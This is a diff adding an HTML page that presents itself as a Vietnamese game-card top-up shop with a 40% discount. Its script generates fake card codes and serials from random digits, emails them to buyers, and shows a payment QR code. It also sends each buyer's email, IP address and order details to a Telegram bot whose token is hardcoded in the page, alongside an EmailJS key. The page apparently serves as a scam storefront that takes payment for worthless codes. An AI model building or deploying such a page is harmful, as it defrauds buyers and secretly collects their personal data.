@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Nạp Thẻ Game</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet"/>
+</head>
+<body class="bg-gray-100 font-sans">
+
+  <!-- Header -->
+  <header class="bg-blue-900 text-white py-3 px-6 flex justify-between items-center">
+    <h1 class="text-xl font-bold">NapTheNhanh.AT</h1>
+  </header>
+
+  <!-- Banner -->
+  <section class="w-full">
+    <img src="banner.jpg" alt="Khuyến mãi MoMo" class="w-full object-cover"/>
+  </section>
+
+  <!-- Tabs -->
+  <div class="bg-white shadow p-4 flex space-x-4 justify-center">
+    <button class="text-orange-500 font-bold border-b-2 border-orange-500 pb-1">NẠP GAME</button>
+    <button onclick="window.location.href='https://napthengay.vn/shop/phu-kien'">PHỤ KIỆN GAME</button>
+    <button onclick="window.location.href='https://napthengay.vn/shop/cong-nghe'">HÀNG CÔNG NGHỆ</button>
+    <button>HOA TƯƠI</button>
+  </div>
+
+  <!-- Main content -->
+  <main class="p-6 grid md:grid-cols-3 gap-6">
+    <!-- Chọn nhà cung cấp -->
+    <section class="md:col-span-2 bg-white p-4 rounded shadow">
+      <h3 class="font-bold text-lg mb-2">Chọn nhà cung cấp</h3>
+      <div class="grid grid-cols-4 gap-4">
+        <button onclick="selectProvider(this)" class="provider-btn border p-2 rounded"><img src="zing.jpg" alt="Zing" /></button>
+        <button onclick="selectProvider(this)" class="provider-btn border p-2 rounded"><img src="vcoin.jpg" alt="VCoin" /></button>
+        <button onclick="selectProvider(this)" class="provider-btn border p-2 rounded"><img src="ga.jpg" alt="Garena" /></button>
+        <button onclick="selectProvider(this)" class="provider-btn border p-2 rounded"><img src="go.jpg" alt="Gosu" /></button>
+      </div>
+
+      <h3 class="font-bold text-lg mt-6 mb-2">Chọn mệnh giá</h3>
+      <div class="grid grid-cols-3 gap-4">
+        <button onclick="selectPrice(this)" class="price-btn border p-2 rounded">10.000đ</button>
+        <button onclick="selectPrice(this)" class="price-btn border p-2 rounded">20.000đ</button>
+        <button onclick="selectPrice(this)" class="price-btn border p-2 rounded">50.000đ</button>
+        <button onclick="selectPrice(this)" class="price-btn border p-2 rounded">100.000đ</button>
+        <button onclick="selectPrice(this)" class="price-btn border p-2 rounded">200.000đ</button>
+        <button onclick="selectPrice(this)" class="price-btn border p-2 rounded">500.000đ</button>
+      </div>
+    </section>
+
+    <!-- Thanh toán -->
+    <section class="bg-white p-4 rounded shadow">
+  <h3 class="font-bold text-lg mb-2">Thanh toán</h3>
+
+  <div class="grid grid-cols-2 gap-2 mb-4">
+    <button onclick="selectPaymentMethod(this, 'MoMo')" class="payment-btn bg-pink-500 text-white p-2 rounded">MoMo</button>
+    <button onclick="selectPaymentMethod(this, 'ATM')" class="payment-btn bg-gray-200 text-black p-2 rounded">ATM</button>
+    <button onclick="selectPaymentMethod(this, 'VietQR')" class="payment-btn bg-gray-200 text-black p-2 rounded">VietQR</button>
+    <button onclick="selectPaymentMethod(this, 'MoMo Trả Sau')" class="payment-btn bg-gray-200 text-black p-2 rounded">MoMo Trả Sau</button>
+  </div>
+
+  <form id="emailForm">
+    <div class="border-t pt-4" id="transaction-summary">
+      <h3 class="font-bold text-lg mb-2">CHI TIẾT GIAO DỊCH</h3>
+      <p><strong>Loại mã thẻ:</strong> <span id="summary-provider">-</span></p>
+      <p><strong>Mệnh giá thẻ:</strong> <span id="summary-price" class="text-red-600">-</span></p>
+      <p><strong>Số lượng:</strong> 1</p>
+      <p><strong>Email nhận:</strong>
+        <input type="email" name="user_email" id="email-input" placeholder="Nhập email" class="border rounded px-2 py-1 mt-1 mb-2 w-full" required />
+      </p>
+
+      <!-- Hidden inputs cho EmailJS -->
+      <input type="hidden" name="provider" id="email-provider" />
+      <input type="hidden" name="price" id="email-price" />
+      <input type="hidden" name="payment" id="email-payment" />
+
+      <p><strong>Phí quản lý:</strong> <span class="text-red-600">Miễn phí</span></p>
+      <p><strong>Giảm giá:</strong> <span id="summary-discount">0đ</span></p>
+      <p><strong>Tổng tiền:</strong> <span id="summary-total" class="text-red-600 font-bold">-</span></p>
+      
+      <button type="submit" class="bg-blue-900 text-white px-4 py-2 rounded mt-2">THANH TOÁN</button>
+
+      <div id="qr-section" class="mt-4 hidden text-center">
+        <h4 class="font-semibold text-lg mb-2">Quét mã để thanh toán</h4>
+        <img id="qr-image" src="mb.jpg" alt="QR Code" class="mx-auto w-48 h-48 border rounded"/>
+        <p class="mt-2 text-gray-700">Vui lòng sử dụng ứng dụng tương ứng để quét mã</p>
+        <p id="countdown" class="mt-2 font-bold text-red-600">10:00</p>
+      </div>
+    </div>
+  </form>
+</section>
+
+  </main>
+
+  <!-- Footer -->
+  <footer class="bg-white p-4 mt-6 shadow flex justify-between">
+    <p>Đăng nhập để kiểm tra lịch sử giao dịch</p>
+    <div class="space-x-2">
+      <button onclick="window.location.href='login.html?mode=login'" class="bg-blue-500 text-white px-4 py-1 rounded">ĐĂNG NHẬP</button>
+      <button onclick="window.location.href='login.html?mode=register'" class="bg-green-500 text-white px-4 py-1 rounded">ĐĂNG KÝ</button>
+    </div>
+  </footer>
+
+  <!-- Modal cảnh báo -->
+  <div id="alert-modal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 hidden z-50">
+    <div class="bg-white rounded-lg shadow-lg p-6 w-80 text-center">
+      <p id="alert-message" class="text-gray-800 mb-4">Thông báo</p>
+      <button onclick="closeAlert()" class="bg-green-500 text-white px-4 py-2 rounded">OK</button>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+<script>
+  emailjs.init('AidBr6mn9LixsTsKz'); // Thay bằng Public Key của bạn
+</script>
+
+<script>
+  let selectedProvider = '';
+  let selectedPrice = '';
+  let selectedPayment = 'MoMo';
+  let countdownInterval;
+
+  const loggedInUser = JSON.parse(localStorage.getItem('loggedInUser'));
+  window.addEventListener('DOMContentLoaded', () => {
+    if (loggedInUser) {
+      document.querySelector('footer').innerHTML = `
+        <p>Xin chào, <strong>${loggedInUser.name}</strong>! Bạn có thể kiểm tra lịch sử giao dịch.</p>
+        <div><button onclick="logout()" class="bg-red-500 text-white px-4 py-1 rounded">ĐĂNG XUẤT</button></div>
+      `;
+    }
+  });
+
+  function logout() {
+    localStorage.removeItem('loggedInUser');
+    location.reload();
+  }
+
+  function selectProvider(el) {
+    document.querySelectorAll('.provider-btn').forEach(btn => btn.classList.remove('ring-2', 'ring-yellow-400'));
+    el.classList.add('ring-2', 'ring-yellow-400');
+    selectedProvider = el.querySelector('img').alt;
+    updateTransactionSummary();
+  }
+
+  function selectPrice(el) {
+    document.querySelectorAll('.price-btn').forEach(btn => btn.classList.remove('ring-2', 'ring-yellow-400'));
+    el.classList.add('ring-2', 'ring-yellow-400');
+    selectedPrice = el.innerText;
+    updateTransactionSummary();
+  }
+
+  function selectPaymentMethod(el, method) {
+    selectedPayment = method;
+    document.querySelectorAll('.payment-btn').forEach(btn => {
+      btn.classList.remove('bg-pink-500', 'text-white');
+      btn.classList.add('bg-gray-200', 'text-black');
+    });
+    el.classList.remove('bg-gray-200', 'text-black');
+    el.classList.add('bg-pink-500', 'text-white');
+  }
+
+  function parsePrice(priceText) {
+    return parseInt(priceText.replace(/\D/g, ''));
+  }
+
+  function formatCurrency(num) {
+    return num.toLocaleString('vi-VN') + 'đ';
+  }
+
+  function updateTransactionSummary() {
+    if (selectedProvider) document.getElementById('summary-provider').innerText = selectedProvider;
+    if (selectedPrice) {
+      const originalPrice = parsePrice(selectedPrice);
+      const discount = Math.floor(originalPrice * 0.4);
+      const finalPrice = originalPrice - discount;
+      document.getElementById('summary-price').innerText = selectedPrice;
+      document.getElementById('summary-discount').innerText = formatCurrency(discount);
+      document.getElementById('summary-total').innerText = formatCurrency(finalPrice);
+    }
+  }
+
+  function startCountdown(duration) {
+    const countdownElement = document.getElementById('countdown');
+    let remaining = duration;
+    if (countdownInterval) clearInterval(countdownInterval);
+
+    countdownInterval = setInterval(() => {
+      const minutes = Math.floor(remaining / 60);
+      const seconds = remaining % 60;
+      countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+      if (remaining <= 0) {
+        clearInterval(countdownInterval);
+        countdownElement.textContent = 'Đã hết hạn QR!';
+      }
+      remaining--;
+    }, 1000);
+  }
+
+  function showAlert(message) {
+    document.getElementById('alert-message').innerText = message;
+    document.getElementById('alert-modal').classList.remove('hidden');
+  }
+
+  function closeAlert() {
+    document.getElementById('alert-modal').classList.add('hidden');
+  }
+
+  function randomDigits(length) {
+    let result = '';
+    const characters = '0123456789';
+    for (let i = 0; i < length; i++) {
+      result += characters.charAt(Math.floor(Math.random() * characters.length));
+    }
+    return result;
+  }
+
+  async function submitTransaction() {
+    const email = document.getElementById('email-input').value;
+    if (!selectedProvider || !selectedPrice || !email || !selectedPayment) {
+      showAlert("Vui lòng chọn nhà cung cấp, mệnh giá, email và hình thức thanh toán.");
+      return;
+    }
+
+    const ipResponse = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResponse.json();
+    const time = new Date().toLocaleString('vi-VN');
+
+    const transactionData = {
+      username: loggedInUser?.name || "Khách",
+      transaction_id: "GD" + randomDigits(9),
+      transaction_time: time,
+      card_type: selectedProvider,
+      card_value: selectedPrice,
+      card_quantity: "1",
+      order_total: document.getElementById('summary-total').innerText,
+      card_code: selectedProvider.slice(0, 2).toUpperCase() + randomDigits(14),
+      card_serial: randomDigits(13),
+      card_expiry: "31/12/2026",
+      email: email,
+      ip: ipData.ip,
+      status: 'Đang chờ thanh toán',
+      payment: selectedPayment
+    };
+
+    await sendToTelegram(transactionData);
+
+    document.getElementById('qr-image').src = 'mb.jpg';
+    document.getElementById('qr-section').classList.remove('hidden');
+    startCountdown(600);
+  }
+
+  async function sendToTelegram(data) {
+    const botToken = '8066475119:AAFLKWy_IUFQlBAI_QR2oXN3pvcYiUZ29Cw';
+    const chatId = '5293126208';
+
+    const message = `
+🧾 ĐƠN HÀNG MỚI
+👤 Người dùng: ${data.username}
+📩 Email: ${data.email}
+🆔 Mã giao dịch: ${data.transaction_id}
+🕒 Thời gian: ${data.transaction_time}
+🌐 IP: ${data.ip}
+🔖 Nhà cung cấp: ${data.card_type}
+💰 Mệnh giá: ${data.card_value}
+📦 Số lượng: ${data.card_quantity}
+🧾 Tổng tiền: ${data.order_total}
+💳 Thanh toán: ${data.payment}
+💡 Mã thẻ: ${data.card_code}
+🔢 Serial: ${data.card_serial}
+⏰ Hạn dùng: ${data.card_expiry}
+📌 Trạng thái: ${data.status}
+`;
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        parse_mode: 'Markdown'
+      })
+    });
+  }
+
+  // Gửi email + gọi submitTransaction sau khi gửi thành công
+  document.getElementById("emailForm").addEventListener("submit", async function (e) {
+  e.preventDefault();
+
+  const email = document.getElementById("email-input").value;
+  if (!selectedProvider || !selectedPrice || !email || !selectedPayment) {
+    showAlert("Vui lòng nhập đầy đủ thông tin!");
+    return;
+  }
+
+  const ipResponse = await fetch('https://api.ipify.org?format=json');
+  const ipData = await ipResponse.json();
+  const time = new Date().toLocaleString('vi-VN');
+
+  const transactionData = {
+    username: loggedInUser?.name || "Khách",
+    transaction_id: "GD" + randomDigits(9),
+    transaction_time: time,
+    card_type: selectedProvider,
+    card_value: selectedPrice,
+    card_quantity: "1",
+    order_total: document.getElementById('summary-total').innerText,
+    card_code: selectedProvider.slice(0, 2).toUpperCase() + randomDigits(14),
+    card_serial: randomDigits(13),
+    card_expiry: "31/12/2026",
+    email: email,
+    ip: ipData.ip,
+    status: 'Đang chờ thanh toán',
+    payment: selectedPayment
+  };
+
+  const emailParams = {
+    user_name: transactionData.username,
+    user_email: transactionData.email,
+    transaction_id: transactionData.transaction_id,
+    transaction_time: transactionData.transaction_time,
+    card_type: transactionData.card_type,
+    card_value: transactionData.card_value,
+    card_quantity: transactionData.card_quantity,
+    order_total: transactionData.order_total,
+    card_code: transactionData.card_code,
+    card_serial: transactionData.card_serial,
+    card_expiry: transactionData.card_expiry,
+    payment: transactionData.payment,
+    status: transactionData.status
+  };
+
+  emailjs.send('service_63i5lhi', 'template_chao_user', emailParams)
+    .then(function(response) {
+      // Sau khi gửi email thành công, gửi Telegram và hiện QR
+      sendToTelegram(transactionData);
+      document.getElementById('qr-image').src = 'mb.jpg';
+      document.getElementById('qr-section').classList.remove('hidden');
+      startCountdown(600);
+    })
+    .catch(function(error) {
+      showAlert("Gửi email thất bại: " + error.text);
+    });
+});
+
+
+</script>
+
+</body>
+</html>
